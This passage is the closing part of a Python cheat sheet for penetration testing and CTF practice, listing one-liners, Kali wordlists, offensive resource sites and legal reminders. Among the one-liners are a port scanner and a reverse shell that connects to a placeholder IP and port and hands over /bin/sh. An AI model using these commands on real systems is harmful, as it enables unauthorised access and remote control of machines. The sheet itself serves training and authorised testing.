logging.debug(f"Sending payload: {payload}")
logging.error("Exploit failed!")
```

# QUICK PYTHON ONE-LINERS FOR PENTESTING
```bash
# Start HTTP server (file sharing)
python3 -m http.server 8000

# Port scanning
python3 -c "import socket; [print(f'Port {p}') for p in range(1,1001) if socket.socket(socket.AF_INET, socket.SOCK_STREAM).connect_ex(('TARGET',p))==0]"

# Base64 encode
python3 -c "import base64; print(base64.b64encode(b'data').decode())"

# Generate reverse shell
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# URL encode
python3 -c "import urllib.parse; print(urllib.parse.quote('test data'))"

# Generate random password
python3 -c "import random,string; print(''.join(random.choices(string.ascii_letters+string.digits,k=16)))"

# Hash password
python3 -c "import hashlib; print(hashlib.md5(b'password').hexdigest())"

# Generate cyclic pattern
python3 -c "from pwn import *; print(cyclic(100))"
```

# RECOMMENDED WORDLISTS & RESOURCES

**Wordlists (Kali Linux):**
- `/usr/share/wordlists/dirb/common.txt` - Directory enumeration
- `/usr/share/wordlists/rockyou.txt` - Password cracking
- `/usr/share/seclists/Discovery/Web-Content/` - Web content discovery
- `/usr/share/seclists/Fuzzing/SQLi/` - SQL injection payloads

**Online Resources:**
- PayloadsAllTheThings: [github.com/swisskyrepo/PayloadsAllTheThings](http://github.com/swisskyrepo/PayloadsAllTheThings)
- HackTricks: book.hacktricks.xyz
- GTFOBins: [gtfobins.github.io](http://gtfobins.github.io)
- RevShells: [revshells.com](http://revshells.com)
- CyberChef: [gchq.github.io/CyberChef](http://gchq.github.io/CyberChef)

**Practice Platforms:**
- TryHackMe: [tryhackme.com](http://tryhackme.com)
- Hack The Box: [hackthebox.com](http://hackthebox.com)
- PicoCTF: [picoctf.org](http://picoctf.org)
- OverTheWire: [overthewire.org](http://overthewire.org)

# FINAL NOTES

**Best Practices:**
- Always test scripts in safe/legal environments first
- Use virtual environments to avoid dependency conflicts
- Comment your code for future reference
- Save successful exploits in a personal repository
- Keep libraries updated: `pip install --upgrade <package>`
- Use version control (git) for your scripts

**Legal Reminder:**
- Only test on systems you own or have explicit permission to test
- Respect scope limitations during engagements
- Follow responsible disclosure practices
- Document all activities for compliance

**Performance Tips:**
- Use threading/multiprocessing for large-scale scanning
- Implement caching for repeated requests
- Use generators for large datasets
- Profile slow scripts: `python3 -m cProfile script.py`

---
Last Updated: October 2025
Created for: Penetration Testing & CTF Challenges
Format: Ready for print or second-screen display
